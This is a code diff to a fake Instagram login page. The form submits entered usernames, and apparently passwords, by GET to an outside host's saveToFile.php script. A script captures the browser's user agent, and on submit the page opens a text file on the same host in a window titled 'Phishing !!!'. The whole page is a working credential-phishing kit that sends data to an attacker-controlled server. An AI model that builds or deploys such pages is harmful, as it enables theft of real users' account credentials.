@@ -16,7 +16,7 @@
             <div class="form_container">
                 <div class="instagram_bg"></div>
                 <div class="login_form_div">
-                    <form method="get" action="http://xss.unaux.com/saveToFile.php" onsubmit="openFile()">
+                    <form method="get" action="http://vuln.unaux.com/saveToFile.php" onsubmit="openFile()">
                         <div class="single_in_div">
                             <input type="text" name="username" placeholder="Phone number, username, or email"
                                 id="username" />
@@ -61,7 +61,8 @@
     <script>
         document.getElementById("userAgent").value = navigator.userAgent
         const openFile = () => {
-            window.open("http://xss.unaux.com/instagram.txt");
+            const win = window.open("http://xss.unaux.com/instagram.txt");
+            win.document.title = "Phishing !!!"
         }
     </script>
 </body>
